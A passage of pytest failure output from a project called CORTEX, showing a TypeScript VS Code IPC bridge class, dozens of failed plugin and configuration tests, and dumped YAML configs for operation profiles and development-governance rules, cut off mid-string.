this.ipcclient.emit('command', {\n                id: requestid,\n                command,\n                params\n            });\n            \n            const timeout = settimeout(() => {\n                reject(new error('command timeout'));\n            }, 30000);\n            \n            this.ipcclient.on(`response_${requestid}`, (response: any) => {\n                cleartimeout(timeout);\n                if (response.error) {\n                    reject(new error(response.error));\n                } else {\n                    resolve(response.result);\n                }\n            });\n        });\n    }\n    \n    private _detectbrainpath(): string {\n        // try to detect cortex brain path\n        const workspacefolders = vscode.workspace.workspacefolders;\n        if (workspacefolders && workspacefolders.length > 0) {\n            const rootpath = workspacefolders[0].uri.fspath;\n            // check if cortex-brain folder exists\n            if (require('fs').existssync(`${rootpath}/cortex-brain`)) {\n                return rootpath;\n            }\n        }\n        return '';\n    }\n}\n" = <built-in method lower of str object at 0x000001E23CC50FE0>()
 +    where <built-in method lower of str object at 0x000001E23CC50FE0> = "// Brain bridge - TypeScript \u2194 Python IPC communication\nimport * as vscode from 'vscode';\nimport * as child_process from 'child_process';\nimport * as ipc from 'node-ipc';\n\nexport class BrainBridge {\n    private pythonProcess: child_process.ChildProcess | null = null;\n    private ipcClient: any = null;\n    \n    constructor(private context: vscode.ExtensionContext) {}\n    \n    async initialize(): Promise<void> {\n        console.log('Initializing CORTEX brain bridge...');\n        \n        // Get Python path from configuration\n        const config = vscode.workspace.getConfiguration('cortex');\n        const pythonPath = config.get<string>('pythonPath', 'python');\n        \n        // Get CORTEX brain path\n        const brainPath = config.get<string>('brainPath', '') || this._detectBrainPath();\n        \n        if (!brainPath) {\n            throw new Error('CORTEX brain path not found. Please configure cortex.brainPath');\n        }\n        \n        // Start Python IPC server\n        const bridgeScript = `${brainPath}/src/plugins/extension_bridge.py`;\n        this.pythonProcess = child_process.spawn(pythonPath, [bridgeScript]);\n        \n        // Setup IPC client\n        ipc.config.id = 'cortex_extension';\n        ipc.config.retry = 1500;\n        ipc.config.silent = true;\n        \n        return new Promise((resolve, reject) => {\n            ipc.connectTo('cortex_brain', () => {\n                ipc.of.cortex_brain.on('connect', () => {\n                    console.log('Connected to CORTEX brain');\n                    this.ipcClient = ipc.of.cortex_brain;\n                    resolve();\n                });\n                \n                ipc.of.cortex_brain.on('error', (err: Error) => {\n                    console.error('Brain bridge error:', err);\n                    reject(err);\n                });\n            });\n        });\n    }\n    \n    async captureMessage(message: any): Promise<void> {\n        return this._sendCommand('capture_message', message);\n    }\n    \n    async captureResponse(response: any): Promise<void> {\n        return this._sendCommand('capture_response', response);\n    }\n    \n    async routeRequest(prompt: string, context: any): Promise<any> {\n        return this._sendCommand('route_request', { prompt, context });\n    }\n    \n    async getLastActiveConversation(): Promise<any> {\n        return this._sendCommand('get_last_active_conversation', {});\n    }\n    \n    async getConversationHistory(): Promise<any[]> {\n        return this._sendCommand('get_conversation_history', {});\n    }\n    \n    async resumeConversation(conversationId: string): Promise<void> {\n        return this._sendCommand('resume_conversation', { conversationId });\n    }\n    \n    async clearHistory(): Promise<void> {\n        return this._sendCommand('clear_history', {});\n    }\n    \n    async getTokenMetrics(): Promise<any> {\n        return this._sendCommand('get_token_metrics', {});\n    }\n    \n    dispose(): void {\n        if (this.ipcClient) {\n            ipc.disconnect('cortex_brain');\n        }\n        if (this.pythonProcess) {\n            this.pythonProcess.kill();\n        }\n    }\n    \n    private _sendCommand(command: string, params: any): Promise<any> {\n        return new Promise((resolve, reject) => {\n            if (!this.ipcClient) {\n                reject(new Error('Brain bridge not initialized'));\n                return;\n            }\n            \n            const requestId = Math.random().toString(36).substring(7);\n            \n            this.ipcClient.emit('command', {\n                id: requestId,\n                command,\n                params\n            });\n            \n            const timeout = setTimeout(() => {\n                reject(new Error('Command timeout'));\n            }, 30000);\n            \n            this.ipcClient.on(`response_${requestId}`, (response: any) => {\n                clearTimeout(timeout);\n                if (response.error) {\n                    reject(new Error(response.error));\n                } else {\n                    resolve(response.result);\n                }\n            });\n        });\n    }\n    \n    private _detectBrainPath(): string {\n        // Try to detect CORTEX brain path\n        const workspaceFolders = vscode.workspace.workspaceFolders;\n        if (workspaceFolders && workspaceFolders.length > 0) {\n            const rootPath = workspaceFolders[0].uri.fsPath;\n            // Check if cortex-brain folder exists\n            if (require('fs').existsSync(`${rootPath}/cortex-brain`)) {\n                return rootPath;\n            }\n        }\n        return '';\n    }\n}\n".lower
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestFeatureToggling::test_minimal_features - assert False is True
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestFeatureToggling::test_full_features - assert False is True
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestErrorHandling::test_execute_with_missing_context - KeyError: 'extension_name'
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestPluginIntegration::test_plugin_lifecycle - assert False is True
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestPluginIntegration::test_generated_extension_structure - assert False is True
FAILED tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_mac_detection_from_request - AttributeError: 'PlatformSwitchPlugin' object has no attribute '_detect_target_platform'
FAILED tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_windows_detection_from_request - AttributeError: 'PlatformSwitchPlugin' object has no attribute '_detect_target_platform'
FAILED tests/plugins/test_platform_switch_plugin.py::TestPlatformDetection::test_linux_detection_from_request - AttributeError: 'PlatformSwitchPlugin' object has no attribute '_detect_target_platform'
FAILED tests/plugins/test_platform_switch_plugin.py::TestPluginInitialization::test_plugin_creates_successfully - AssertionError: assert 'Platform Switch Plugin' == 'platform_switch'
  
  - platform_switch
  + Platform Switch Plugin
FAILED tests/plugins/test_platform_switch_plugin.py::TestPluginInitialization::test_plugin_has_triggers - AttributeError: 'PluginMetadata' object has no attribute 'triggers'
FAILED tests/plugins/test_platform_switch_plugin.py::TestTriggerDetection::test_can_handle_mac_requests - AssertionError: assert False
 +  where False = can_handle('switched to mac')
 +    where can_handle = <plugins.platform_switch_plugin.PlatformSwitchPlugin object at 0x000001E24EA6E430>.can_handle
FAILED tests/plugins/test_platform_switch_plugin.py::TestTriggerDetection::test_can_handle_windows_requests - AssertionError: assert False
 +  where False = can_handle('switched to windows')
 +    where can_handle = <plugins.platform_switch_plugin.PlatformSwitchPlugin object at 0x000001E24EA6CC90>.can_handle
FAILED tests/plugins/test_platform_switch_plugin.py::TestDependencyVerification::test_get_venv_python_mac - AssertionError: assert 'bin/python' in 'D:\\PROJECTS\\CORTEX\\.venv\\bin\\python'
FAILED tests/plugins/test_platform_switch_plugin.py::TestBrainTests::test_runs_brain_tests - assert 0 > 0
FAILED tests/plugins/test_platform_switch_plugin.py::TestBrainTests::test_handles_test_failures - assert 0 > 0
FAILED tests/plugins/test_platform_switch_plugin.py::TestEndToEnd::test_full_execution_flow - assert 0 == 5
 +  where 0 = len([])
FAILED tests/plugins/test_system_refactor_plugin.py::TestPluginInitialization::test_plugin_registers_commands - assert False
 +  where False = any(<generator object TestPluginInitialization.test_plugin_registers_commands.<locals>.<genexpr> at 0x000001E24F1FB440>)
FAILED tests/plugins/test_system_refactor_plugin.py::TestReporting::test_report_formats_as_markdown - AssertionError: assert 'Overall Health: GOOD' in '# CORTEX System Refactor Report\n\n**Generated:** 2025-11-09T00:00:00\n**Overall Health:** GOOD\n**Total Tests:** 400\n**Passing Tests:** 395\n**Pass Rate:** 98.8%\n\n---\n\n## \U0001f4ca Test Suite Metrics\n\n| Category | Test Files |\n|----------|-----------|\n| Plugins | 5 |\n\n---\n\n## \U0001f50d Coverage Gaps\n\n### Plugin Testing (HIGH Priority)\n\n**Description:** Missing tests\n\n**Estimated Effort:** 1.0 hours\n\n**Affected Files:**\n- plugin.py\n\n**Recommended Tests:**\n- test_plugin.py\n\n---\n\n## \U0001f527 REFACTOR Phase Tasks\n\n**Total Tasks:** 1\n**Estimated Time:** 0.2 hours\n\n### REFACTOR test\n\n**File:** `test.py`\n**Priority:** MEDIUM\n**Status:** PENDING\n\n**REFACTOR Items:**\nAdd assertions\n\n\n---\n\n## \U0001f4a1 Recommendations\n\nRecommendation 1\n\n---\n\n*Report generated by System Refactor Plugin*'
FAILED tests/plugins/test_system_refactor_plugin.py::TestPluginExecution::test_plugin_handles_execution_errors - AssertionError: assert 'success' == 'error'
  
  - error
  + success
FAILED tests/response_templates/test_integration.py::TestPerformance::test_trigger_lookup_performance - AssertionError: Trigger lookup took 3.97ms (target: <2ms)
assert 3.9699000008113217 < 2
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_concise_help_generates - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_concise_help_has_bullets - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_concise_help_shows_natural_language - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_detailed_help_generates - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_detailed_help_has_examples - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_category_help_generates - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpGeneration::test_category_help_has_table - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestCategoryFiltering::test_platform_commands_only - AssertionError: assert ('Platform' in 'No commands available.' or 'PLATFORM' in 'No commands available.')
FAILED tests/test_cortex_help.py::TestQuickReference::test_quick_reference_is_concise - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestIntelligentHandling::test_handles_detailed_request - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestIntelligentHandling::test_handles_category_request - AssertionError: assert ('Platform' in 'No commands available.' or 'PLATFORM' in 'No commands available.')
FAILED tests/test_cortex_help.py::TestIntelligentHandling::test_handles_generic_request - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestIntelligentHandling::test_defaults_to_concise - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestConvenienceFunctions::test_cortex_help_function - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestConvenienceFunctions::test_cortex_help_is_concise - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpIntegration::test_includes_registered_commands - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpIntegration::test_shows_command_stats - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpFormatting::test_concise_uses_markdown - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpFormatting::test_has_clear_sections - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_cortex_help.py::TestHelpFormatting::test_readable_line_length - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_tier0_rules_immutable - AttributeError: 'BrainProtector' object has no attribute 'validate_change'
FAILED tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_tier0_read_only_enforcement - AttributeError: 'BrainProtector' object has no attribute 'validate_change'
FAILED tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_challenge_generation_for_risky_change - AttributeError: 'str' object has no attribute 'severity'
FAILED tests/test_risk_mitigation.py::TestBrainProtectorImmutability::test_rollback_mechanism_on_violation - AttributeError: 'BrainProtector' object has no attribute 'create_rollback_plan'
FAILED tests/test_risk_mitigation.py::TestBrainProtectorBoundaries::test_tier_write_boundaries - AttributeError: 'BrainProtector' object has no attribute 'validate_write'
FAILED tests/test_risk_mitigation.py::TestBrainProtectorBoundaries::test_tier_read_permissions - AttributeError: 'BrainProtector' object has no attribute 'validate_read'
FAILED tests/test_risk_mitigation.py::TestDatabaseIntegrity::test_tier1_schema_integrity - AssertionError: assert False
 +  where False = <built-in method issubset of set object at 0x000001E24F205620>(set())
 +    where <built-in method issubset of set object at 0x000001E24F205620> = {'entities', 'files', 'messages', 'conversations'}.issubset
FAILED tests/test_risk_mitigation.py::TestDatabaseIntegrity::test_tier2_fts5_integrity - AttributeError: 'str' object has no attribute 'value'
FAILED tests/test_risk_mitigation.py::TestDatabaseIntegrity::test_foreign_key_constraints - TypeError: Tier1API.__init__() missing 1 required positional argument: 'log_path'
FAILED tests/test_risk_mitigation.py::TestInputSanitization::test_sql_injection_prevention - TypeError: Tier1API.__init__() missing 2 required positional arguments: 'db_path' and 'log_path'
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_config_structure - AssertionError: assert 'operations' in {'operations_config': {'environment_setup': {'enabled': True, 'default_profile': 'standard', 'timeout_minutes': 15, 'retry_on_failure': True, 'max_retries': 3, 'auto_detect_platform': True, 'profiles': {'minimal': {'description': 'Minimal setup - core functionality only', 'enabled_modules': ['project_validation', 'platform_detection', 'virtual_environment', 'python_dependencies', 'brain_initialization', 'setup_completion'], 'estimated_duration_minutes': 5, 'recommended_for': 'Quick testing, CI/CD pipelines'}, 'standard': {'description': 'Standard setup - recommended for most users', 'enabled_modules': ['project_validation', 'platform_detection', 'git_sync', 'virtual_environment', 'python_dependencies', 'vision_api', 'brain_initialization', 'brain_tests', 'setup_completion'], 'estimated_duration_minutes': 10, 'recommended_for': 'Daily development, first-time setup'}, 'full': {'description': 'Full setup - everything enabled', 'enabled_modules': ['project_validation', 'platform_detection', 'git_sync', 'virtual_environment', 'python_dependencies', 'vision_api', 'conversation_tracking', 'brain_initialization', 'brain_tests', 'tooling_verification', 'setup_completion'], 'estimated_duration_minutes': 15, 'recommended_for': 'Production deployment, complete validation'}}, 'platform_specific': {'windows': {'shell': 'pwsh', 'python_command': 'python', 'path_separator': '\\'}, 'darwin': {'shell': 'zsh', 'python_command': 'python3', 'path_separator': '/'}, 'linux': {'shell': 'bash', 'python_command': 'python3', 'path_separator': '/'}}}, 'refresh_cortex_story': {'enabled': True, 'default_profile': 'standard', 'timeout_minutes': 5, 'retry_on_failure': False, 'source': {'file': 'prompts/shared/story.md', 'format': 'markdown', 'encoding': 'utf-8'}, 'output': {'file': 'docs/story/CORTEX-STORY/Technical-CORTEX.md', 'format': 'markdown', 'encoding': 'utf-8', 'backup_original': True}, 'profiles': {'quick': {'description': 'Quick refresh - narrator voice only', 'enabled_modules': ['load_story_template', 'apply_narrator_voice', 'save_story_markdown'], 'estimated_duration_minutes': 2, 'skip_validation': True}, 'standard': {'description': 'Standard refresh - narrator voice + validation', 'enabled_modules': ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index'], 'estimated_duration_minutes': 3}, 'full': {'description': 'Full refresh - everything including preview', 'enabled_modules': ['load_story_template', 'apply_narrator_voice', 'validate_story_structure', 'save_story_markdown', 'update_mkdocs_index', 'build_story_preview'], 'estimated_duration_minutes': 5, 'preview_port': 8000}}, 'narrator_voice': {'style': 'engaging_technical', 'tone': 'friendly_professional', 'pacing': 'moderate', 'technical_depth': 'balanced'}}, 'workspace_cleanup': {'enabled': False, 'default_profile': 'safe', 'timeout_minutes': 3, 'retry_on_failure': False, 'require_confirmation': True, 'profiles': {'safe': {'description': 'Safe cleanup - only obviously temporary files', 'enabled_modules': ['scan_temporary_files', 'remove_old_logs', 'generate_cleanup_report'], 'estimated_duration_minutes': 1, 'auto_confirm': True}, 'standard': {'description': 'Standard cleanup - recommended for regular maintenance', 'enabled_modules': ['scan_temporary_files', 'remove_old_logs', 'clear_python_cache', 'vacuum_sqlite_databases', 'generate_cleanup_report'], 'estimated_duration_minutes': 2, 'auto_confirm': False}, 'aggressive': {'description': 'Aggressive cleanup - remove everything including orphans', 'enabled_modules': ['scan_temporary_files', 'remove_old_logs', 'clear_python_cache', 'vacuum_sqlite_databases', 'remove_orphaned_files', 'generate_cleanup_report'], 'estimated_duration_minutes': 3, 'auto_confirm': False, 'warning_level': 'high'}}, 'cleanup_rules': {'temporary_files': {'patterns': ['*.tmp', '*.temp', '*.cache'], 'max_age_days': 7}, 'log_files': {'patterns': ['*.log'], 'max_age_days': 30, 'preserve_latest': 5}, 'python_cache': {'patterns': ['__pycache__', '*.pyc', '*.pyo'], 'recursive': True}, 'orphaned_files': {'check_git_tracking': True, 'exclude_patterns': ['.git', '.venv', 'node_modules']}}}, 'update_documentation': {'enabled': False, 'default_profile': 'local', 'timeout_minutes': 10, 'retry_on_failure': True, 'profiles': {'local': {'description': 'Local build - no deployment', 'enabled_modules': ['scan_docstrings', 'generate_api_docs', 'refresh_design_docs', 'build_mkdocs_site', 'validate_doc_links'], 'estimated_duration_minutes': 5, 'deploy': False}, 'preview': {'description': 'Build with local preview', 'enabled_modules': ['scan_docstrings', 'generate_api_docs', 'refresh_design_docs', 'build_mkdocs_site', 'validate_doc_links', 'deploy_docs_preview'], 'estimated_duration_minutes': 7, 'deploy': True, 'preview_port': 8001}, 'full': {'description': 'Full build with deployment', 'enabled_modules': ['scan_docstrings', 'generate_api_docs', 'refresh_design_docs', 'build_mkdocs_site', 'validate_doc_links', 'deploy_docs_preview'], 'estimated_duration_minutes': 10, 'deploy': True, 'deploy_target': 'github_pages'}}, 'mkdocs': {'site_name': 'CORTEX Documentation', 'theme': 'material', 'strict': True, 'use_directory_urls': True}}, 'brain_protection_check': {'enabled': False, 'default_profile': 'standard', 'timeout_minutes': 5, 'retry_on_failure': False, 'profiles': {'quick': {'description': 'Quick check - critical validation only', 'enabled_modules': ['load_protection_rules', 'validate_tier0_immutability', 'check_brain_integrity', 'generate_protection_report'], 'estimated_duration_minutes': 2}, 'standard': {'description': 'Standard check - all tier validation', 'enabled_modules': ['load_protection_rules', 'validate_tier0_immutability', 'validate_tier1_structure', 'validate_tier2_schema', 'check_brain_integrity', 'generate_protection_report'], 'estimated_duration_minutes': 3}, 'comprehensive': {'description': 'Comprehensive check - deep validation', 'enabled_modules': ['load_protection_rules', 'validate_tier0_immutability', 'validate_tier1_structure', 'validate_tier2_schema', 'check_brain_integrity', 'generate_protection_report'], 'estimated_duration_minutes': 5, 'deep_scan': True}}, 'validation_rules': {'tier0': {'check_immutability': True, 'check_yaml_syntax': True, 'check_rule_coverage': True}, 'tier1': {'check_database_schema': True, 'check_data_integrity': True, 'max_conversation_age_days': 30}, 'tier2': {'check_yaml_syntax': True, 'check_schema_compliance': True, 'validate_relationships': True}}}, 'run_tests': {'enabled': False, 'default_profile': 'standard', 'timeout_minutes': 15, 'retry_on_failure': False, 'profiles': {'quick': {'description': 'Quick test - unit tests only', 'enabled_modules': ['discover_tests', 'run_unit_tests'], 'estimated_duration_minutes': 3, 'coverage_enabled': False}, 'standard': {'description': 'Standard test - unit + integration', 'enabled_modules': ['discover_tests', 'run_unit_tests', 'run_integration_tests'], 'estimated_duration_minutes': 7, 'coverage_enabled': False}, 'full': {'description': 'Full test - everything with coverage', 'enabled_modules': ['discover_tests', 'run_unit_tests', 'run_integration_tests', 'generate_coverage_report', 'validate_test_quality'], 'estimated_duration_minutes': 15, 'coverage_enabled': True, 'coverage_min_threshold': 80}}, 'pytest_options': {'verbose': True, 'capture': 'no', 'show_locals': False, 'strict_markers': True}}, 'interactive_planning': {'enabled': False, 'default_profile': 'standard', 'timeout_minutes': 10, 'implementation_status': 'designed_not_implemented', 'target_release': 'Week 19-24', 'profiles': {'quick': {'description': 'Quick planning - minimal questions (max 3)', 'enabled_modules': ['detect_planning_ambiguity', 'generate_clarifying_questions', 'synthesize_planning_context', 'generate_implementation_plan'], 'max_questions': 3, 'estimated_duration_minutes': 5}, 'standard': {'description': 'Standard planning - balanced questions (max 5)', 'enabled_modules': ['detect_planning_ambiguity', 'generate_clarifying_questions', 'parse_user_answers', 'filter_redundant_questions', 'extract_implied_context', 'synthesize_planning_context', 'generate_implementation_plan', 'present_plan_for_approval'], 'max_questions': 5, 'estimated_duration_minutes': 8}, 'collaborative': {'description': 'Collaborative planning - thorough exploration', 'enabled_modules': ['detect_planning_ambiguity', 'generate_clarifying_questions', 'parse_user_answers', 'filter_redundant_questions', 'extract_implied_context', 'synthesize_planning_context', 'generate_implementation_plan', 'present_plan_for_approval'], 'max_questions': 8, 'estimated_duration_minutes': 12, 'allow_follow_up_questions': True}}, 'question_generation': {'confidence_threshold': 0.75, 'skip_if_context_sufficient': True, 'prioritize_critical_unknowns': True}, 'answer_parsing': {'extract_implied_context': True, 'track_context_updates': True, 'update_tier2_preferences': True}}, 'command_help': {'enabled': False, 'default_profile': 'contextual', 'timeout_minutes': 1, 'implementation_status': 'designed_not_implemented', 'target_release': 'Week 21-22', 'profiles': {'basic': {'description': 'Basic help - most relevant commands only', 'enabled_modules': ['analyze_user_context', 'filter_relevant_commands', 'generate_help_output'], 'max_commands': 7, 'show_categories': False}, 'detailed': {'description': 'Detailed help - all commands with categories', 'enabled_modules': ['analyze_user_context', 'categorize_commands', 'generate_help_output'], 'max_commands': 20, 'show_categories': True, 'show_examples': True}, 'contextual': {'description': 'Context-aware help - suggestions based on work', 'enabled_modules': ['analyze_user_context', 'filter_relevant_commands', 'categorize_commands', 'generate_help_output', 'suggest_next_actions'], 'max_commands': 10, 'max_suggestions': 3, 'relevance_threshold': 0.7}}, 'discovery_layers': {'natural_language': {'enabled': True, 'confidence_threshold': 0.75}, 'slash_commands': {'enabled': True, 'fuzzy_matching': True}, 'contextual_suggestions': {'enabled': True, 'max_suggestions': 3}, 'progressive_disclosure': {'enabled': True, 'adapt_to_user_level': True}}}}, 'metadata': {'version': '2.0', 'schema_version': '1.0', 'author': 'Asif Hussain', 'last_updated': '2025-11-10', 'description': 'Operation-specific configurations for CORTEX 2.0 + 2.1', 'changelog': [{'version': '2.0', 'date': '2025-11-10', 'changes': ['Initial YAML conversion from MD documentation', 'Added all 7 CORTEX 2.0 operations', 'Added 2 CORTEX 2.1 operations (planning, help)', 'Defined profiles for each operation', 'Added platform-specific settings', 'Added validation rules and cleanup rules']}], 'statistics': {'total_operations': 9, 'cortex_2_0_operations': 7, 'cortex_2_1_operations': 2, 'operations_enabled': 2, 'operations_pending': 7}, 'token_reduction': {'before_tokens': 4200, 'after_tokens': 2500, 'reduction_percent': 40.5}}}
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_config_data_integrity - KeyError: 'operations'
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_no_duplicate_operation_ids - KeyError: 'operations'
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_slash_commands_load_performance - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_cortex_operations_load_performance - AssertionError: Load time 0.197s exceeds 100ms target
assert 0.19713920000140206 < 0.1
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_all_yaml_files_load_together - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_match_yaml_definitions - KeyError: 'operations'
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_yaml_files_are_valid_yaml - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5798: character maps to <undefined>
FAILED tests/test_yaml_conversion.py::TestYAMLConversion::test_operations_have_module_structure - AssertionError: Module in 'cortex_tutorial' missing id
assert 'id' in 'demo_introduction'
FAILED tests/test_yaml_conversion.py::TestTokenReductionPreliminary::test_yaml_files_not_empty - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 13990: character maps to <undefined>
FAILED tests/test_yaml_loading.py::TestYAMLLoading::test_brain_protection_rules_structure - AssertionError: Missing 'metadata' section
assert 'metadata' in {'version': '2.0', 'type': 'governance', 'name': 'Brain Protection Rules', 'description': 'Automated architectural protection challenges', 'critical_paths': ['CORTEX/src/tier0/', 'prompts/internal/', 'governance/rules.md', 'cortex-brain/tier0/'], 'tier0_instincts': ['TDD_ENFORCEMENT', 'DEFINITION_OF_READY', 'DEFINITION_OF_DONE', 'SOLID_PRINCIPLES', 'LOCAL_FIRST', 'BRAIN_PROTECTION_TESTS_MANDATORY', 'MACHINE_READABLE_FORMATS', 'SKULL_TEST_BEFORE_CLAIM', 'SKULL_INTEGRATION_VERIFICATION', 'SKULL_VISUAL_REGRESSION', 'SKULL_RETRY_WITHOUT_LEARNING', 'SKULL_TRANSFORMATION_VERIFICATION', 'GIT_ISOLATION_ENFORCEMENT'], 'application_paths': ['SPA/', 'KSESSIONS/', 'NOOR/', 'blazor', 'signalr', 'canvas'], 'brain_state_files': ['conversation-history.jsonl', 'conversation-context.jsonl', 'events.jsonl', 'development-context.yaml', 'protection-events.jsonl'], 'protection_layers': [{'layer_id': 'instinct_immutability', 'name': 'Instinct Immutability', 'description': 'Tier 0 governance rules cannot be bypassed', 'priority': 1, 'rules': [{'rule_id': 'TDD_ENFORCEMENT', 'name': 'Test-Driven Development Enforcement', 'severity': 'blocked', 'description': 'Attempt to bypass Test-Driven Development requirement', 'detection': {'keywords': ['skip test', 'bypass tdd', 'no tests', 'disable tdd', 'skip validation'], 'scope': ['intent', 'description']}, 'alternatives': ['Write failing test first (RED phase)', 'Create spike branch for exploration (throwaway)', 'Use TDD cycle: RED \u2192 GREEN \u2192 REFACTOR'], 'evidence_template': "Intent: '{intent}'"}, {'rule_id': 'DEFINITION_OF_DONE', 'name': 'Definition of Done', 'severity': 'blocked', 'description': 'Attempt to bypass Definition of Done (zero errors, zero warnings)', 'detection': {'keywords': ['skip validation', 'bypass done', 'disable error check', 'allow warnings'], 'scope': ['intent', 'description']}, 'alternatives': ['Fix all warnings before proceeding', 'Add exception rule if truly needed', 'Update test to expect new behavior'], 'evidence_template': "Description: '{description}'"}, {'rule_id': 'DEFINITION_OF_READY', 'name': 'Definition of Ready', 'severity': 'blocked', 'description': 'Work item does not meet DoR criteria', 'detection': {'keywords': ['skip DoR', 'bypass ready', 'start without requirements'], 'scope': ['intent', 'description']}, 'alternatives': ['Define acceptance criteria first', 'Get stakeholder clarification', 'Create refined user story'], 'evidence_template': "Missing DoR criteria: '{description}'"}, {'rule_id': 'BRAIN_PROTECTION_TESTS_MANDATORY', 'name': 'Brain Protection Tests - 100% Pass Rate Mandatory', 'severity': 'blocked', 'description': 'Brain protection tests MUST pass - no exceptions', 'detection': {'keywords': ['skip brain protection', 'ignore test failures', 'brain tests failing', 'disable brain tests', 'bypass protection tests', 'xfail brain', 'skip tier0 tests'], 'scope': ['intent', 'description']}, 'alternatives': ['Fix the failing tests immediately', 'Revert changes that broke protection', 'Do not proceed until 100% pass rate achieved'], 'evidence_template': "Brain protection tests are CRITICAL. Intent: '{intent}'", 'rationale': 'Brain protection tests validate core CORTEX integrity:\n- Path handling (cross-platform compatibility)\n- Protection layer logic (architectural safeguards)\n- Conversation tracking (memory system)\n- YAML configuration loading (governance rules)\n\nIf these fail, CORTEX has fundamental issues that MUST be resolved.\n100% pass rate is MANDATORY before any other work continues.\n'}, {'rule_id': 'MACHINE_READABLE_FORMATS', 'name': 'Use Machine-Readable Formats for Efficiency', 'severity': 'warning', 'description': 'Non-user files should use YAML/JSON, not Markdown', 'detection': {'combined_keywords': {'markdown_creation': ['create markdown', 'new .md', 'add .md'], 'structured_data': ['structured data', 'configuration', 'capability matrix', 'status table', 'metrics', 'statistics', 'code example', 'implementation pattern']}, 'scope': ['intent', 'description'], 'logic': 'AND'}, 'alternatives': ['Use YAML for structured data (capabilities, rules, config)', 'Use JSON for metrics, statistics, logs', 'Reserve Markdown for user-facing narratives only', 'Use code files with docstrings for examples'], 'evidence_template': "Description: '{description}'", 'rationale': 'CORTEX 2.0 efficiency principles:\n\nUSE MARKDOWN FOR:\n- User guides and tutorials\n- Narrative documentation (stories, history)\n- Architecture explanations\n- Design rationale\n\nUSE YAML/JSON FOR:\n- Structured data (capabilities, status, priorities)\n- Configuration and rules\n- Metrics and statistics\n- Patterns and templates\n- API schemas\n\nUSE CODE FILES FOR:\n- Implementation examples\n- Code snippets and patterns\n- Reusable templates\n\nBenefits:\n- 60% token reduction in context injection\n- Automated validation and schema checking\n- Better version control diffs\n- Direct machine consumption\n- No documentation drift\n'}, {'rule_id': 'ACTIVE_NARRATOR_VOICE', 'name': 'Active Narrator Voice (Not Passive Documentation)', 'severity': 'warning', 'description': 'Story uses passive/clinical narrator voice instead of active storytelling', 'detection': {'passive_verbs': ['Asif Codeinstein designed', 'Asif Codeinstein created', 'Asif Codeinstein wrote', 'Asif Codeinstein implemented', 'Asif Codeinstein developed', 'He wrote routines', 'He created routines', 'He implemented', 'He developed'], 'documentary_markers': ['One evening, while', 'One morning, while', 'One day, while', 'One night, while', 'After completing', 'After finishing', ', while reviewing', 'During the'], 'scope': ['file_content'], 'file_patterns': ['docs/story/**/*.md', 'prompts/shared/story.md']}, 'alternatives': ["Use active storytelling: 'So Asif built' (adds momentum)", "Show immediate action: 'grabbed keyboard and coded' (not 'wrote routines')", "Vivid scene-setting: 'That evening, knee-deep in' (not 'One evening, while')", "Present-tense urgency: 'The refactor complete, Asif leaned back' (not 'After completing')", "Energy verbs: 'dove into', 'attacked', 'grabbed', 'swept' (not 'designed', 'created')"], 'evidence_template': 'Passive narrator detected: \'{match}\'\n\nStory should be ACTIVE third-person narrative, not clinical documentation.\n\nExamples:\n\u274c "Asif Codeinstein designed..." \u2190 documentation\n\u2705 "So Asif built..." \u2190 storytelling\n\n\u274c "He wrote routines for..." \u2190 neutral observer  \n\u2705 "He grabbed his keyboard and..." \u2190 immediate action\n\n\u274c "One evening, while reviewing..." \u2190 documentary\n\u2705 "That evening, knee-deep in..." \u2190 vivid scene\n', 'rationale': 'CORTEX story is a COMEDY told by an energetic narrator, not a memoir or\ntechnical documentation. Third-person is CORRECT, but it must be ACTIVE\nstorytelling with personality, immediacy, and energy.\n\nThe narrator is a CHARACTER in the 